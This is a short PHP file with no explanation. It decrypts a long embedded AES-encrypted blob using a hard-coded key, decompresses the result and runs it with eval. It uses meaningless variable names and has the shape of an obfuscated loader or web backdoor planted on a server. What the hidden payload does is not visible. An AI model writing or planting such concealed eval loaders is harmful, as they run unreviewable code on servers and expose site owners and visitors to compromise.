<?php

$sdjkfjhjss='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';


function decryptData2($data, $key) {
    return openssl_decrypt($data, 'AES-256-CBC', $key, 0, substr(hash('sha256', $key), 0, 16));
}

$kkzjxjcbdbhshdgfhsghdf=decryptData2($sdjkfjhjss, 'hlj8_secret_key');

eval(gzinflate(base64_decode($kkzjxjcbdbhshdgfhsghdf)));
?>